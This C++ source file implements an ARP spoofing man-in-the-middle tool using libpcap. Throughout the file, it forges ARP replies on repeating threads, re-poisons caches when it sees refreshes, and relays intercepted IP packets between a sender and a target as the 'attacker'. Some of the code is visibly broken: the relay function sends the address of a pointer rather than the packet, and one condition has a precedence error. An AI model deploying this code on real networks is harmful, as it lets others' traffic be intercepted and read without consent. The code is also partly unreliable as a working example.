#include "spoof.h"

Mac getMac(pcap_t* handle, Ip attackerIp, Mac attackerMac, Ip ip)
{
	EthArpPacket pkt = EthArpPacket(ArpHdr::Request, Mac::broadcastMac(), attackerMac, EthHdr::Arp, ArpHdr::ETHER, EthHdr::Ip4, Mac::SIZE, Ip::SIZE, attackerMac, attackerIp, Mac::nullMac(), ip);
	
	std::thread thread1(continueSendArp, handle, pkt, 3);
	
	while (true)
		{
			struct pcap_pkthdr *header;
			const u_char *reply_packet;
			int result = pcap_next_ex(handle, &header, &reply_packet);
			if (result != 1)
			{
				continue;
			}
			EthArpPacket *reply = (EthArpPacket *)reply_packet;

			if (ntohs(reply->eth_.type_) == EthHdr::Arp && ntohs(reply->arp_.op_) == ArpHdr::Reply &&
				reply->arp_.sip_ == Ip(htonl(ip)) && reply->arp_.tip_ == Ip(htonl(attackerIp)))
			{
				thread1.detach();
				return reply->arp_.smac_;
			}
		}
}

void sendArp(pcap_t *handle, EthArpPacket pkt)
{
	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&pkt), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
	else
	{
		printf("\n----------------------------------------\n");
		printf("[*] Arp packet sending succeeded!");
		printf("\n----------------------------------------\n");
	}
}

void sendIp(pcap_t *handle, const u_char *pkt)
{
	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&pkt), sizeof(EthIpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
	else
	{
		printf("\n----------------------------------------\n");
		printf("[*] Ip packet relaying succeeded!");
		printf("\n----------------------------------------\n");
	}
}

void continueSendArp(pcap_t *handle, EthArpPacket pkt, int repeat)
{
	while(true)
	{
		sendArp(handle, pkt);
		sleep(repeat);
	}
}

bool isRefreshed(pcap_t* handle, const u_char *receivedPkt, FlowInfo flow)
{
	EthArpPacket *pkt = (EthArpPacket *)receivedPkt;
	// case : broadcast (ARP)
	if(pkt->eth_.type_ == EthHdr::Arp && pkt->eth_.dmac_ == Mac::broadcastMac())
	{
		// sender broadcast
		if(pkt->arp_.sip_ == flow.senderIp && pkt->eth_.smac_ == flow.senderMac)
		{
			return true;
		}
		// target broadcast
		if(pkt->arp_.sip_ == flow.targetIp && pkt->eth_.smac_ == flow.targetMac)
		{
			return true;
		}
	}
	else // case : unicast
	{
		// sender -> target
		if(pkt->arp_.sip_ == flow.senderIp && pkt->eth_.smac_ == flow.senderMac)
		{
			if(pkt->arp_.tip_ == flow.targetIp && pkt->arp_.tmac_ == flow.attackerMac)
			{
				return true;
			}
		}
	}
	return false;
}

void relayPacket(pcap_t *handle, const u_char *receivedPkt, FlowInfo flow)
{
	// Check that receivedPkt is from sender, and destination mac is attacker(me)
	if(((EthIpPacket *)receivedPkt)->eth_.type_ == EthHdr::Ip4 || ((EthIpPacket *)receivedPkt)->eth_.type_ == EthHdr::Ip6 &&
	((EthIpPacket *)receivedPkt)->eth_.dmac_ == flow.attackerMac)
	{
		// Check if it's the receivedPkt for attacker(me)
		if(((EthIpPacket *)receivedPkt)->ip_.dip_ != flow.attackerIp)
		{ // if it is not the packet for me, modify and relay the packet
			((EthIpPacket *)receivedPkt)->eth_.smac_ = flow.attackerMac;
			((EthIpPacket *)receivedPkt)->eth_.dmac_ = flow.targetMac;
			sendIp(handle, receivedPkt);
		}
		
	}
}

void spoofProcess(int mode, pcap_t *handle, EthArpPacket pkt, FlowInfo flow)
{
	struct pcap_pkthdr *header;
	const u_char *receivedPkt;
	std::thread sendArpThread(continueSendArp, handle, pkt, 10);
	while (true)
	{
		int result = pcap_next_ex(handle, &header, &receivedPkt);
		if (result == 0)
			continue;
		if (result == PCAP_ERROR || result == PCAP_ERROR_BREAK)
		{
			printf("pcap_next_ex return %d(%s)\n", result, pcap_geterr(handle));
			break;
		}

		if (isRefreshed(handle, receivedPkt, flow))
			sendArp(handle, pkt);
		else
			relayPacket(handle, receivedPkt, flow);
	}

	sendArpThread.detach();
}